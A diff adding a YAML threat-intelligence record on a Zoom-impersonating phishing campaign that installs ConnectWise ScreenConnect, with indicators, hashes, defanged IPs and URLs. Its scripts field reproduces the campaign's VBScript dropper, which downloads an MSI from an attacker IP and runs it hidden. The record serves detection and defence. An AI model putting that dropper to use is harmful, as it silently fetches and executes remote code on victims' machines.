@@ -1,0 +1,47 @@
+title: Zoom Phishing Campaign Using ConnectWise ScreenConnect
+description: Adversaries impersonate Zoom to deliver the legitimate remote monitoring
+  tool, ConnectWise ScreenConnect, for persistent access and secondary malware deployment.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes:
+  - ScreenConnect ClientService.exe
+  - ScreenConnect WindowsClient.exe
+  command_lines: []
+  powershell: []
+  scripts:
+  - Dim url, tempPath, http, stream Aurl = hXXp://212[.]11[.]64[.]45/Bin/ScreenConnect[.]ClientSetup[.]msi?e=Access&y=Guest&c=zoom%20link&c=zoom&c=&c=&c=&c=&c=&c="Set
+    Wshshell = Createobject("WScript.shell")tempPath = Wshshell.ExpandEnvironmentStrings("%TEMP%")
+    & "\ScreenConnect.ClientSetup.msi"Set http = CreateObject("MSXML2.ServerXMLHTTP")http.Open
+    "GET", url, Falsehttp.SendIf http.Status = 200 ThenSet stream = CreateObject("ADODB.Stream")stream.Openstream.Type
+    = 1stream.Write http.responseBodystream.SaveToFile tempPath, 2stream.CloseWshshell.Run
+    chr(34) & tempPath & Chr(34), 0End If
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - hXXp://212[.]11[.]64[.]45/Bin/ScreenConnect[.]ClientSetup[.]msi?e=Access&y=Guest&c=zoom%20link&c=zoom&c=&c=&c=&c=&c=&c=
+  file_activity:
+  - _zoommeeting_Zoom_Installer_64_bit.exe.vbs
+  - ScreenConnect.ClientSetup.msi
+  - ScreenConnect.WindowsClient.exe
+  persistence: []
+  process_relations: []
+iocs:
+  hashes:
+  - b677ceaabb0be3911d1d3c80b1f84899
+  - 90247b84e192a582c5af8bc75c3a7611cc9621b4683a7ccb68901f4f22503e00
+  - 9562334dd9a47ec1239a8667ddc1f01c
+  - b80d07610b81bddb3d7f30a207a2e134b559e06b8440598a926f3a9c1d439218
+  ip_addresses:
+  - 104[.]21[.]56[.]35
+  - 172[.]67[.]176[.]105
+  - 212[.]11[.]64[.]45
+  domains: []
+  urls:
+  - hXXps://join-meeting-invite-id-567765[.]nasbv[.]site/
+authors:
+- Cobi Aloia
+reference: https://cofense.com/blog/click-install-compromised-the-new-wave-of-zoom-themed-attacks
+date_of_publication: May 19, 2026
+file_creation_date: May 19, 2026
